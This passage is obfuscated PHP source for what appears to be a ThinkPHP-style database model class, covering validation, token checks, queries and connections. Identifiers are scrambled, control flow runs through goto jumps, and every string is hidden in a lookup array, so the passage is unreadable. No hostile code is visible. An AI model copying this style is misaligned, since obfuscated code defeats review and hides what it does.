bËÉ´Òµ“Ì; bËÉ´Òµ“Ì: } protected function _afterFind(&$C¶”ÉÂÜ½, $Aæ£Õ×ÊøÊ) { } protected function returnResult($B†—Ò ÔÇĞ, $E¾Ûß¯ºÄá = '') { $Cë‚ëç²ë„ =& $_SERVER[œº]; if ($E¾Ûß¯ºÄá) { if (is_callable($E¾Ûß¯ºÄá)) { return call_user_func($E¾Ûß¯ºÄá, $B†—Ò ÔÇĞ); } switch (strtolower($E¾Ûß¯ºÄá)) { case $Cë‚ëç²ë„[292]: return json_encode($B†—Ò ÔÇĞ); case $Cë‚ëç²ë„[293]: return xml_encode($B†—Ò ÔÇĞ); } } return $B†—Ò ÔÇĞ; } public function parseFieldsMap($cßÒæß‰îÄ, $C¸›Çé… = 1) { if (!empty($this->_map)) { foreach ($this->_map as $b¸Àì²…®È => $c‰ô»öÔ‰„) { if ($C¸›Çé… == 1) { if (isset($cßÒæß‰îÄ[$c‰ô»öÔ‰„])) { $cßÒæß‰îÄ[$b¸Àì²…®È] = $cßÒæß‰îÄ[$c‰ô»öÔ‰„]; unset($cßÒæß‰îÄ[$c‰ô»öÔ‰„]); } } else { if (isset($cßÒæß‰îÄ[$b¸Àì²…®È])) { $cßÒæß‰îÄ[$c‰ô»öÔ‰„] = $cßÒæß‰îÄ[$b¸Àì²…®È]; unset($cßÒæß‰îÄ[$b¸Àì²…®È]); } } } } return $cßÒæß‰îÄ; } public function setField($F¨ó£ØÑ‰Ÿ, $d„ĞµÄ· = '') { if (is_array($F¨ó£ØÑ‰Ÿ)) { $CËÓë¼Ù¤ = $F¨ó£ØÑ‰Ÿ; } else { $CËÓë¼Ù¤[$F¨ó£ØÑ‰Ÿ] = $d„ĞµÄ·; } return $this->save($CËÓë¼Ù¤); } public function setAdd($DøÁ½ˆ‚Ÿ, $E·Ù©ÄÊÜ = 1) { $e½œœÑÁ¡ =& $_SERVER[œº]; $d‰ˆà¾£¬× = $DøÁ½ˆ‚Ÿ . $e½œœÑÁ¡[294] . $E·Ù©ÄÊÜ; if ($E·Ù©ÄÊÜ < 0) { $d‰ˆà¾£¬× = $DøÁ½ˆ‚Ÿ . $E·Ù©ÄÊÜ; } return $this->setField($DøÁ½ˆ‚Ÿ, array($e½œœÑÁ¡[295], $d‰ˆà¾£¬×)); } public function getField($BÜé¦‚²æâ, $EÇ‚¡¶ØŠï = null) { $aŞå¦¹¾‚Î =& $_SERVER[œº]; $B×©‘«îÆå[$aŞå¦¹¾‚Î[271]] = $BÜé¦‚²æâ; $B×©‘«îÆå = $this->_parseOptions($B×©‘«îÆå); $BÜé¦‚²æâ = trim($BÜé¦‚²æâ); if (strpos($BÜé¦‚²æâ, $aŞå¦¹¾‚Î[47])) { if (!isset($B×©‘«îÆå[$aŞå¦¹¾‚Î[290]])) { $B×©‘«îÆå[$aŞå¦¹¾‚Î[290]] = is_numeric($EÇ‚¡¶ØŠï) ? $EÇ‚¡¶ØŠï : $aŞå¦¹¾‚Î[33]; } $fó‘ê×ÓéŒ = $this->db->select($B×©‘«îÆå); if (!empty($fó‘ê×ÓéŒ)) { goto FçåŸ¢¯öÀ; FçåŸ¢¯öÀ: $cÁİ»¦ãõ¿ = explode($aŞå¦¹¾‚Î[47], $BÜé¦‚²æâ); $BÜé¦‚²æâ = array_keys($fó‘ê×ÓéŒ[0]); $båá¸Á¨ª– = array_shift($BÜé¦‚²æâ); goto C§†Ìîø; C§†Ìîø: $Aè¼–å™˜ = array_shift($BÜé¦‚²æâ); $e®¸¿††‹ = array(); $BÒ“ÌçáØæ = count($cÁİ»¦ãõ¿); goto a©¡İ¢ªÖÇ; a©¡İ¢ªÖÇ: foreach ($fó‘ê×ÓéŒ as $fˆ‹ÑÏìŞï) { $B¡Î¥¾²‡ã = $fˆ‹ÑÏìŞï[$båá¸Á¨ª–]; if (2 == $BÒ“ÌçáØæ) { $e®¸¿††‹[$B¡Î¥¾²‡ã] = $fˆ‹ÑÏìŞï[$Aè¼–å™˜]; } else { $e®¸¿††‹[$B¡Î¥¾²‡ã] = is_string($EÇ‚¡¶ØŠï) ? implode($EÇ‚¡¶ØŠï, $fˆ‹ÑÏìŞï) : $fˆ‹ÑÏìŞï; } } return $e®¸¿††‹; goto BÇ’§”Ììó; BÇ’§”Ììó: } } else { if (!0 !== $EÇ‚¡¶ØŠï) { $B×©‘«îÆå[$aŞå¦¹¾‚Î[290]] = is_numeric($EÇ‚¡¶ØŠï) ? $EÇ‚¡¶ØŠï : 1; } if ($EÇ‚¡¶ØŠï === $aŞå¦¹¾‚Î[253]) { unset($B×©‘«îÆå[$aŞå¦¹¾‚Î[290]]); } $fˆ‹ÑÏìŞï = $this->db->select($B×©‘«îÆå); if (!empty($fˆ‹ÑÏìŞï)) { if ($EÇ‚¡¶ØŠï === $aŞå¦¹¾‚Î[253]) { return reset($fˆ‹ÑÏìŞï[0]); } if (!0 !== $EÇ‚¡¶ØŠï && 1 == $B×©‘«îÆå[$aŞå¦¹¾‚Î[290]]) { return reset($fˆ‹ÑÏìŞï[0]); } foreach ($fˆ‹ÑÏìŞï as $AÎÀ±ÊŸ§) { $AìÊ“‡Õ[] = $AÎÀ±ÊŸ§[$BÜé¦‚²æâ]; } return $AìÊ“‡Õ; } } return null; } public function create($bÓ‘ ©…– = '', $B‚ôŠÏ¿ë‘ = '') { goto fÔÌßĞ…¹; b­¨ÂÃ‡´ˆ: if ($this->autoCheckFields) { $a„¦ŒÙÆòĞ = $this->getDbFields(); foreach ($bÓ‘ ©…– as $BÇçÒ‰“ˆ¸ => $bøÓô®±Šª) { if (!in_array($BÇçÒ‰“ˆ¸, $a„¦ŒÙÆòĞ)) { unset($bÓ‘ ©…–[$BÇçÒ‰“ˆ¸]); } elseif (MAGIC_QUOTES_GPC && is_string($bøÓô®±Šª)) { $bÓ‘ ©…–[$BÇçÒ‰“ˆ¸] = stripslashes($bøÓô®±Šª); } } } $this->autoOperation($bÓ‘ ©…–, $B‚ôŠÏ¿ë‘); $this->data = $bÓ‘ ©…–; goto f®ÍŠòœÆ; fÔÌßĞ…¹: $b¥Š›óæÏğ =& $_SERVER[œº]; if (empty($bÓ‘ ©…–)) { $bÓ‘ ©…– = $_POST; } elseif (is_object($bÓ‘ ©…–)) { $bÓ‘ ©…– = get_object_vars($bÓ‘ ©…–); } if (empty($bÓ‘ ©…–) || !is_array($bÓ‘ ©…–)) { $this->error = think_lang($b¥Š›óæÏğ[269]); return !1; } goto Bã¹ÌÅ¹µ; f®ÍŠòœÆ: return $bÓ‘ ©…–; goto cÖ¹¸Ù§ï; Bã¹ÌÅ¹µ: $bÓ‘ ©…– = $this->parseFieldsMap($bÓ‘ ©…–, 0); $B‚ôŠÏ¿ë‘ = $B‚ôŠÏ¿ë‘ ? $B‚ôŠÏ¿ë‘ : (!empty($bÓ‘ ©…–[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$b¥Š›óæÏğ[271]])) { $a„¦ŒÙÆòĞ = $this->options[$b¥Š›óæÏğ[271]]; unset($this->options[$b¥Š›óæÏğ[271]]); } elseif ($B‚ôŠÏ¿ë‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $a„¦ŒÙÆòĞ = $this->insertFields; } elseif ($B‚ôŠÏ¿ë‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $a„¦ŒÙÆòĞ = $this->updateFields; } goto fÀ“ˆ´·á; fÀ“ˆ´·á: if (isset($a„¦ŒÙÆòĞ)) { if (is_string($a„¦ŒÙÆòĞ)) { $a„¦ŒÙÆòĞ = explode($b¥Š›óæÏğ[47], $a„¦ŒÙÆòĞ); } if (think_config($b¥Š›óæÏğ[296])) { $a„¦ŒÙÆòĞ[] = think_config($b¥Š›óæÏğ[297]); } foreach ($bÓ‘ ©…– as $BÇçÒ‰“ˆ¸ => $bøÓô®±Šª) { if (!in_array($BÇçÒ‰“ˆ¸, $a„¦ŒÙÆòĞ)) { unset($bÓ‘ ©…–[$BÇçÒ‰“ˆ¸]); } } } if (!$this->autoValidation($bÓ‘ ©…–, $B‚ôŠÏ¿ë‘)) { return !1; } if (!$this->autoCheckToken($bÓ‘ ©…–)) { $this->error = think_lang($b¥Š›óæÏğ[298]); return !1; } goto b­¨ÂÃ‡´ˆ; cÖ¹¸Ù§ï: } public function autoCheckToken($b¨›´Ú¿ùì) { $F¬ ÔğæÒ˜ =& $_SERVER[œº]; if (isset($this->options[$F¬ ÔğæÒ˜[299]]) && !$this->options[$F¬ ÔğæÒ˜[299]]) { return !0; } if (think_config($F¬ ÔğæÒ˜[296])) { $Fóíõ„¾ƒó = think_config($F¬ ÔğæÒ˜[297]); if (!isset($b¨›´Ú¿ùì[$Fóíõ„¾ƒó]) || Session::get($Fóíõ„¾ƒó)) { return !1; } list($CÂáŠ•ŠœÀ, $DÈÓŞˆ—×İ) = explode($F¬ ÔğæÒ˜[71], $b¨›´Ú¿ùì[$Fóíõ„¾ƒó]); if ($DÈÓŞˆ—×İ && Session::get($Fóíõ„¾ƒó . $F¬ ÔğæÒ˜[95] . $CÂáŠ•ŠœÀ) === $DÈÓŞˆ—×İ) { Session::remove($Fóíõ„¾ƒó . $F¬ ÔğæÒ˜[95] . $CÂáŠ•ŠœÀ); return !0; } if (think_config($F¬ ÔğæÒ˜[300])) { Session::remove($Fóíõ„¾ƒó . $F¬ ÔğæÒ˜[95] . $CÂáŠ•ŠœÀ); } return !1; } return !0; } public function regex($CñãÄ÷£µâ, $AæÈÕ§œ¦) { $E«¦áïØ‰ =& $_SERVER[œº]; $a‡“¯¸¨Àö = array($E«¦áïØ‰[301] => $E«¦áïØ‰[302], $E«¦áïØ‰[303] => $E«¦áïØ‰[304], $E«¦áïØ‰[305] => $E«¦áïØ‰[306], $E«¦áïØ‰[307] => $E«¦áïØ‰[308], $E«¦áïØ‰[309] => $E«¦áïØ‰[310], $E«¦áïØ‰[311] => $E«¦áïØ‰[312], $E«¦áïØ‰[313] => $E«¦áïØ‰[314], $E«¦áïØ‰[288] => $E«¦áïØ‰[315], $E«¦áïØ‰[316] => $E«¦áïØ‰[317]); if (isset($a‡“¯¸¨Àö[strtolower($AæÈÕ§œ¦)])) { $AæÈÕ§œ¦ = $a‡“¯¸¨Àö[strtolower($AæÈÕ§œ¦)]; } return preg_match($AæÈÕ§œ¦, $CñãÄ÷£µâ) === 1; } private function autoOperation(&$b“ÔÑßù¶, $CãŸñÈ„Öñ) { $FÏ¯°µ‡ =& $_SERVER[œº]; if (!empty($this->options[$FÏ¯°µ‡[318]])) { $D¹ÀĞøœ¦® = $this->options[$FÏ¯°µ‡[318]]; unset($this->options[$FÏ¯°µ‡[318]]); } elseif (!empty($this->_auto)) { $D¹ÀĞøœ¦® = $this->_auto; } if (isset($D¹ÀĞøœ¦®)) { foreach ($D¹ÀĞøœ¦® as $aÃåŠ¼Ø©ğ) { if (empty($aÃåŠ¼Ø©ğ[2])) { $aÃåŠ¼Ø©ğ[2] = THINK_MODEL_INSERT; } if ($CãŸñÈ„Öñ == $aÃåŠ¼Ø©ğ[2] || $aÃåŠ¼Ø©ğ[2] == THINK_MODEL_BOTH) { switch (trim($aÃåŠ¼Ø©ğ[3])) { case $FÏ¯°µ‡[319]: case $FÏ¯°µ‡[320]: $C¡É‚£Í = isset($aÃåŠ¼Ø©ğ[4]) ? (array) $aÃåŠ¼Ø©ğ[4] : array(); if (isset($b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]])) { array_unshift($C¡É‚£Í, $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]]); } if ($FÏ¯°µ‡[319] == $aÃåŠ¼Ø©ğ[3]) { $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]] = call_user_func_array($aÃåŠ¼Ø©ğ[1], $C¡É‚£Í); } else { $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]] = call_user_func_array(array(&$this, $aÃåŠ¼Ø©ğ[1]), $C¡É‚£Í); } break; case $FÏ¯°µ‡[271]: $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]] = $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[1]]; break; case $FÏ¯°µ‡[321]: if ($FÏ¯°µ‡[33] === $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]]) { unset($b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]]); } break; case $FÏ¯°µ‡[322]: default: $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]] = $aÃåŠ¼Ø©ğ[1]; } if (!1 === $b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]]) { unset($b“ÔÑßù¶[$aÃåŠ¼Ø©ğ[0]]); } } } } return $b“ÔÑßù¶; } protected function autoValidation($e¤İ•µá©, $d¿òˆ¿ÃÌÔ) { $cÛÙÆêƒäà =& $_SERVER[œº]; if (!empty($this->options[$cÛÙÆêƒäà[323]])) { $bñÒÍå¥ß = $this->options[$cÛÙÆêƒäà[323]]; unset($this->options[$cÛÙÆêƒäà[323]]); } elseif (!empty($this->_validate)) { $bñÒÍå¥ß = $this->_validate; } if (isset($bñÒÍå¥ß)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bñÒÍå¥ß as $Dµ´ëç¥æ => $BËÜÑ¤ƒ Ñ) { if (empty($BËÜÑ¤ƒ Ñ[5]) || $BËÜÑ¤ƒ Ñ[5] == THINK_MODEL_BOTH || $BËÜÑ¤ƒ Ñ[5] == $d¿òˆ¿ÃÌÔ) { if (0 == strpos($BËÜÑ¤ƒ Ñ[2], $cÛÙÆêƒäà[324]) && strpos($BËÜÑ¤ƒ Ñ[2], $cÛÙÆêƒäà[325])) { $BËÜÑ¤ƒ Ñ[2] = think_lang(substr($BËÜÑ¤ƒ Ñ[2], 2, -1)); } $BËÜÑ¤ƒ Ñ[3] = isset($BËÜÑ¤ƒ Ñ[3]) ? $BËÜÑ¤ƒ Ñ[3] : THINK_EXISTS_VALIDATE; $BËÜÑ¤ƒ Ñ[4] = isset($BËÜÑ¤ƒ Ñ[4]) ? $BËÜÑ¤ƒ Ñ[4] : $cÛÙÆêƒäà[326]; switch ($BËÜÑ¤ƒ Ñ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($e¤İ•µá©, $BËÜÑ¤ƒ Ñ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cÛÙÆêƒäà[33] != trim($e¤İ•µá©[$BËÜÑ¤ƒ Ñ[0]])) { if (!1 === $this->_validationField($e¤İ•µá©, $BËÜÑ¤ƒ Ñ)) { return !1; } } break; default: if (isset($e¤İ•µá©[$BËÜÑ¤ƒ Ñ[0]])) { if (!1 === $this->_validationField($e¤İ•µá©, $BËÜÑ¤ƒ Ñ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($BŠ¼±é³Ší, $eÇ§Õ¢Õ) { if (!1 === $this->_validationFieldItem($BŠ¼±é³Ší, $eÇ§Õ¢Õ)) { if ($this->patchValidate) { $this->error[$eÇ§Õ¢Õ[0]] = $eÇ§Õ¢Õ[2]; } else { $this->error = $eÇ§Õ¢Õ[2]; return !1; } } return; } protected function _validationFieldItem($CÖéï¤ËŞÍ, $fÇù¦•í„‹) { $fÌá¹£– =& $_SERVER[œº]; switch (strtolower(trim($fÇù¦•í„‹[4]))) { case $fÌá¹£–[319]: case $fÌá¹£–[320]: $A»Úğ¹Šô‰ = isset($fÇù¦•í„‹[6]) ? (array) $fÇù¦•í„‹[6] : array(); if (is_string($fÇù¦•í„‹[0]) && strpos($fÇù¦•í„‹[0], $fÌá¹£–[47])) { $fÇù¦•í„‹[0] = explode($fÌá¹£–[47], $fÇù¦•í„‹[0]); } if (is_array($fÇù¦•í„‹[0])) { foreach ($fÇù¦•í„‹[0] as $BÊ£—·ñ‡×) { $dôÁğ‘È‹[$BÊ£—·ñ‡×] = $CÖéï¤ËŞÍ[$BÊ£—·ñ‡×]; } array_unshift($A»Úğ¹Šô‰, $dôÁğ‘È‹); } else { array_unshift($A»Úğ¹Šô‰, $CÖéï¤ËŞÍ[$fÇù¦•í„‹[0]]); } if ($fÌá¹£–[319] == $fÇù¦•í„‹[4]) { return call_user_func_array($fÇù¦•í„‹[1], $A»Úğ¹Šô‰); } else { return call_user_func_array(array(&$this, $fÇù¦•í„‹[1]), $A»Úğ¹Šô‰); } case $fÌá¹£–[327]: return $CÖéï¤ËŞÍ[$fÇù¦•í„‹[0]] == $CÖéï¤ËŞÍ[$fÇù¦•í„‹[1]]; case $fÌá¹£–[328]: if (is_string($fÇù¦•í„‹[0]) && strpos($fÇù¦•í„‹[0], $fÌá¹£–[47])) { $fÇù¦•í„‹[0] = explode($fÌá¹£–[47], $fÇù¦•í„‹[0]); } $AœÆê¯îŒÅ = array(); if (is_array($fÇù¦•í„‹[0])) { foreach ($fÇù¦•í„‹[0] as $BÊ£—·ñ‡×) { $AœÆê¯îŒÅ[$BÊ£—·ñ‡×] = $CÖéï¤ËŞÍ[$BÊ£—·ñ‡×]; } } else { $AœÆê¯îŒÅ[$fÇù¦•í„‹[0]] = $CÖéï¤ËŞÍ[$fÇù¦•í„‹[0]]; } if (!empty($CÖéï¤ËŞÍ[$this->getPk()])) { $AœÆê¯îŒÅ[$this->getPk()] = array($fÌá¹£–[329], $CÖéï¤ËŞÍ[$this->getPk()]); } if ($this->where($AœÆê¯îŒÅ)->find()) { return !1; } return !0; default: return $this->check($CÖéï¤ËŞÍ[$fÇù¦•í„‹[0]], $fÇù¦•í„‹[1], $fÇù¦•í„‹[4]); } } public function check($Eª¨òœ¨Ã¨, $a§ï…©¡çÂ, $bÑ„§ÀÅŞ = "\x72\145\147\x65\x78") { $eÃ‡‰±®Ê =& $_SERVER[œº]; $bÑ„§ÀÅŞ = strtolower(trim($bÑ„§ÀÅŞ)); switch ($bÑ„§ÀÅŞ) { case $eÃ‡‰±®Ê[7]: case $eÃ‡‰±®Ê[330]: $c·¤‹ö¢ŠÕ = is_array($a§ï…©¡çÂ) ? $a§ï…©¡çÂ : explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ); return $bÑ„§ÀÅŞ == $eÃ‡‰±®Ê[7] ? in_array($Eª¨òœ¨Ã¨, $c·¤‹ö¢ŠÕ) : !in_array($Eª¨òœ¨Ã¨, $c·¤‹ö¢ŠÕ); case $eÃ‡‰±®Ê[331]: case $eÃ‡‰±®Ê[332]: if (is_array($a§ï…©¡çÂ)) { $fÇä¢Œß¶ñ = $a§ï…©¡çÂ[0]; $FĞ¼Ç®ñˆö = $a§ï…©¡çÂ[1]; } else { list($fÇä¢Œß¶ñ, $FĞ¼Ç®ñˆö) = explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ); } return $bÑ„§ÀÅŞ == $eÃ‡‰±®Ê[331] ? $Eª¨òœ¨Ã¨ >= $fÇä¢Œß¶ñ && $Eª¨òœ¨Ã¨ <= $FĞ¼Ç®ñˆö : $Eª¨òœ¨Ã¨ < $fÇä¢Œß¶ñ || $Eª¨òœ¨Ã¨ > $FĞ¼Ç®ñˆö; case $eÃ‡‰±®Ê[333]: case $eÃ‡‰±®Ê[334]: return $bÑ„§ÀÅŞ == $eÃ‡‰±®Ê[333] ? $Eª¨òœ¨Ã¨ == $a§ï…©¡çÂ : $Eª¨òœ¨Ã¨ != $a§ï…©¡çÂ; case $eÃ‡‰±®Ê[335]: $B‰Ê±Û„Õ– = mb_strlen($Eª¨òœ¨Ã¨, $eÃ‡‰±®Ê[336]); if (strpos($a§ï…©¡çÂ, $eÃ‡‰±®Ê[47])) { list($fÇä¢Œß¶ñ, $FĞ¼Ç®ñˆö) = explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ); return $B‰Ê±Û„Õ– >= $fÇä¢Œß¶ñ && $B‰Ê±Û„Õ– <= $FĞ¼Ç®ñˆö; } else { return $B‰Ê±Û„Õ– == $a§ï…©¡çÂ; } case $eÃ‡‰±®Ê[337]: list($a˜æİéÊ¬, $E Øå»¿ï) = explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ); if (!is_numeric($a˜æİéÊ¬)) { $a˜æİéÊ¬ = strtotime($a˜æİéÊ¬); } if (!is_numeric($E Øå»¿ï)) { $E Øå»¿ï = strtotime($E Øå»¿ï); } return NOW_TIME >= $a˜æİéÊ¬ && NOW_TIME <= $E Øå»¿ï; case $eÃ‡‰±®Ê[338]: return in_array(get_client_ip(), explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ)); case $eÃ‡‰±®Ê[339]: return !in_array(get_client_ip(), explode($eÃ‡‰±®Ê[47], $a§ï…©¡çÂ)); case $eÃ‡‰±®Ê[326]: default: return $this->regex($Eª¨òœ¨Ã¨, $a§ï…©¡çÂ); } } public function query($e½‹‚Öíˆë, $EÍ‡æ‘‹İ = false) { $F†¸ßˆí»õ =& $_SERVER[œº]; if (!is_bool($EÍ‡æ‘‹İ) && !is_array($EÍ‡æ‘‹İ)) { $EÍ‡æ‘‹İ = func_get_args(); array_shift($EÍ‡æ‘‹İ); } $e½‹‚Öíˆë = str_replace(array($F†¸ßˆí»õ[229], $F†¸ßˆí»õ[340]), $F†¸ßˆí»õ[50], $e½‹‚Öíˆë); $e½‹‚Öíˆë = $this->parseSql($e½‹‚Öíˆë, $EÍ‡æ‘‹İ); return $this->db->query($e½‹‚Öíˆë); } public function execute($D£‚áßà´ , $F¾ó“âîÛÄ = false) { if (!is_bool($F¾ó“âîÛÄ) && !is_array($F¾ó“âîÛÄ)) { $F¾ó“âîÛÄ = func_get_args(); array_shift($F¾ó“âîÛÄ); } $D£‚áßà´  = $this->parseSql($D£‚áßà´ , $F¾ó“âîÛÄ); return $this->db->execute($D£‚áßà´ ); } protected function parseSql($Aã¨¬È¬ôÊ, $eĞ—¤ŠÈ›Ğ) { $c‰¹óÎ½¸É =& $_SERVER[œº]; if (!0 === $eĞ—¤ŠÈ›Ğ) { $e¢…à‡ØÌÌ = $this->_parseOptions(); $Aã¨¬È¬ôÊ = $this->db->parseSql($Aã¨¬È¬ôÊ, $e¢…à‡ØÌÌ); } elseif (is_array($eĞ—¤ŠÈ›Ğ)) { $eĞ—¤ŠÈ›Ğ = array_map(array($this->db, $c‰¹óÎ½¸É[341]), $eĞ—¤ŠÈ›Ğ); $Aã¨¬È¬ôÊ = vsprintf($Aã¨¬È¬ôÊ, $eĞ—¤ŠÈ›Ğ); } else { $Aã¨¬È¬ôÊ = strtr($Aã¨¬È¬ôÊ, array($c‰¹óÎ½¸É[342] => $this->getTableName(), $c‰¹óÎ½¸É[343] => think_config($c‰¹óÎ½¸É[242]))); } $this->db->setModel($this->name); return $Aã¨¬È¬ôÊ; } public function db($D„À˜¥îÓÓ = '', $AÍ£àâó® = '', $eøÍ›º««ë = array()) { goto B«¤÷«î¡Ó; a›‹ß×ˆ: $a½’êÀŸ½İ[$D„À˜¥îÓÓ] = $AÍ£àâó®; $this->db = $e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ]; $this->_after_db(); goto a¼å¾Ï×„; B«¤÷«î¡Ó: $cøéŠëµ¼ñ =& $_SERVER[œº]; if ($cøéŠëµ¼ñ[33] === $D„À˜¥îÓÓ && $this->db) { return $this->db; } static $a½’êÀŸ½İ = array(); goto AÙ‘›˜Ç¶Î; AÙ‘›˜Ç¶Î: static $e‘ÊÁ¢ƒ‰ò = array(); if (!isset($e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ]) || isset($e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ]) && $AÍ£àâó® && $a½’êÀŸ½İ[$D„À˜¥îÓÓ] != $AÍ£àâó®) { if (!empty($AÍ£àâó®) && is_string($AÍ£àâó®) && !1 === strpos($AÍ£àâó®, $cøéŠëµ¼ñ[8])) { $AÍ£àâó® = think_config($AÍ£àâó®); } $e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ] = Db::getInstance($AÍ£àâó®); } elseif (NULL === $AÍ£àâó®) { $e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ]->close(); unset($e‘ÊÁ¢ƒ‰ò[$D„À˜¥îÓÓ]); return; } if (!empty($eøÍ›º««ë)) { if (is_string($eøÍ›º««ë)) { parse_str($eøÍ›º««ë, $eøÍ›º««ë); } foreach ($eøÍ›º««ë as $E—Ü‘ÕÒŠ => $a‚ÒğŠ×­) { $this->setProperty($E—Ü‘ÕÒŠ, $a‚ÒğŠ×­); } } goto a›‹ß×ˆ; a¼å¾Ï×„: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto BÙğ´¬®£; BÙğ´¬®£: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aË¸†‹‰÷¼ = get_class($this); if ($aË¸†‹‰÷¼ == $_SERVER[œº][344]) { return $this->name; } $this->name = substr($aË¸†‹‰÷¼, 0, -5); } return $this->name; } public function getTableName() { $e×©‘‹¥³Ä =& $_SERVER[œº]; if (empty($this->trueTableName)) { $a¬®‘¦Çò˜ = !empty($this->tablePrefix) ? $this->tablePrefix : $e×©‘‹¥³Ä[33]; if (!empty($this->tableName)) { $a¬®‘¦Çò˜ .= $this->tableName; } else { $a¬®‘¦Çò˜ .= think_parse_name($this->name); } $this->trueTableName = strtolower($a¬®‘¦Çò˜); } return (!empty($this->dbName) ? $this->dbName . $e×©‘‹¥³Ä[95] : $e×©‘‹¥³Ä[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $C¾ÙŒ†® =& $_SERVER[œº]; return isset($this->fields[$C¾ÙŒ†®[249]]) ? $this->fields[$C¾ÙŒ†®[249]] : $this->pk; } public function getDbFields() { $Dë½ÕŞ¦ç³ =& $_SERVER[œº]; if (isset($this->options[$Dë½ÕŞ¦ç³[277]])) { $BÜİĞÌ®„‚ = $this->db->getFields($this->options[$Dë½ÕŞ¦ç³[277]]); return $BÜİĞÌ®„‚ ? array_keys($BÜİĞÌ®„‚) : !1; } if ($this->fields) { $BÜİĞÌ®„‚ = $this->fields; unset($BÜİĞÌ®„‚[$Dë½ÕŞ¦ç³[248]], $BÜİĞÌ®„‚[$Dë½ÕŞ¦ç³[249]], $BÜİĞÌ®„‚[$Dë½ÕŞ¦ç³[250]], $BÜİĞÌ®„‚[$Dë½ÕŞ¦ç³[247]]); return $BÜİĞÌ®„‚; } return !1; } public function data($dâÖª½ŠÔ‰ = '') { $CÛ‰ÂİøŒ =& $_SERVER[œº]; if ($CÛ‰ÂİøŒ[33] === $dâÖª½ŠÔ‰ && !empty($this->data)) { return $this->data; } if (is_object($dâÖª½ŠÔ‰)) { $dâÖª½ŠÔ‰ = get_object_vars($dâÖª½ŠÔ‰); } elseif (is_string($dâÖª½ŠÔ‰)) { parse_str($dâÖª½ŠÔ‰, $dâÖª½ŠÔ‰); } elseif (!is_array($dâÖª½ŠÔ‰)) { think_exception(think_lang($CÛ‰ÂİøŒ[269])); } $this->data = $dâÖª½ŠÔ‰; return $this; } public function join($C¾êÊÈ¡©) { $añ¸½´àÈ =& $_SERVER[œº]; if (is_array($C¾êÊÈ¡©)) { $this->options[$añ¸½´àÈ[280]] = $C¾êÊÈ¡©; } elseif (!empty($C¾êÊÈ¡©)) { $this->options[$añ¸½´àÈ[280]][] = $C¾êÊÈ¡©; } return $this; } public function union($FŸ÷¶ÃÅ·, $A©àÕ‚Ü‡³ = false) { goto câ†°ÈÄ´ä; câ†°ÈÄ´ä: $d‘‘é­šÙ… =& $_SERVER[œº]; if (empty($FŸ÷¶ÃÅ·)) { return $this; } if ($A©àÕ‚Ü‡³) { $this->options[$d‘‘é­šÙ…[345]][$d‘‘é­šÙ…[346]] = !0; } goto AÄºä›È«î; fĞŠÖêâóí: return $this; goto aÅŸ‰Ş÷Ï; AÄºä›È«î: if (is_object($FŸ÷¶ÃÅ·)) { $FŸ÷¶ÃÅ· = get_object_vars($FŸ÷¶ÃÅ·); } if (is_string($FŸ÷¶ÃÅ·)) { $eì¿ˆÉå³÷ = $FŸ÷¶ÃÅ·; } elseif (is_array($FŸ÷¶ÃÅ·)) { if (isset($FŸ÷¶ÃÅ·[0])) { $this->options[$d‘‘é­šÙ…[345]] = array_merge($this->options[$d‘‘é­šÙ…[345]], $FŸ÷¶ÃÅ·); return $this; } else { $eì¿ˆÉå³÷ = $FŸ÷¶ÃÅ·; } } else { think_exception(think_lang($d‘‘é­šÙ…[269])); } $this->options[$d‘‘é­šÙ…[345]][] = $eì¿ˆÉå³÷; goto fĞŠÖêâóí; aÅŸ‰Ş÷Ï: } public function cache($cë ˆÔÂÇ = true, $fÈ™í½è¹º = null, $cË”é‘»´‡ = '') { $f‹¢¸®ì±Š =& $_SERVER[œº]; if (!1 !== $cë ˆÔÂÇ) { $this->options[$f‹¢¸®ì±Š[347]] = array($f‹¢¸®ì±Š[93] => $cë ˆÔÂÇ, $f‹¢¸®ì±Š[337] => $fÈ™í½è¹º, $f‹¢¸®ì±Š[29] => $cË”é‘»´‡); } return $this; } public function field($dÆç–Äëš, $A¨‡ÉˆÒÄ = false) { $D¬ñ…Åí‰µ =& $_SERVER[œº]; if (!0 === $dÆç–Äëš) { $Cãƒ®‚ìøë = $this->getDbFields(); $dÆç–Äëš = $Cãƒ®‚ìøë ? $Cãƒ®‚ìøë : $D¬ñ…Åí‰µ[182]; } elseif ($A¨‡ÉˆÒÄ) { if (is_string($dÆç–Äëš)) { $dÆç–Äëš = explode($D¬ñ…Åí‰µ[47], 